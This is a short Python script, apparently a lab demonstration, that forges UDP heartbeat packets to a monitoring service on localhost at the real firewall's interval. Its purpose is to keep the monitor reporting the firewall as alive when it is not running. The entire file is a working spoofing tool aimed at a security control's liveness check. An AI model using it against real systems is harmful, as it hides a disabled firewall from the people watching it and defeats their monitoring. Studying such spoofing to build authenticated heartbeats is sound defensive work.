import socket
import time

MONITOR_IP = "127.0.0.1"
MONITOR_PORT = 8000
# Match the real firewall's cadence so the forgery is indistinguishable.
HEARTBEAT_INTERVAL = 3.0

def spoof():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[SPOOFER] Forging heartbeats to {MONITOR_IP}:{MONITOR_PORT} "
          f"every {HEARTBEAT_INTERVAL}s. The firewall does not need to be running.")
    try:
        while True:
            sock.sendto(b"HEARTBEAT", (MONITOR_IP, MONITOR_PORT))
            print("[SPOOFER] sent forged HEARTBEAT 💉")
            time.sleep(HEARTBEAT_INTERVAL)
    except KeyboardInterrupt:
        print("\n[SPOOFER] Stopped.")
    finally:
        sock.close()

if __name__ == "__main__":
    spoof()
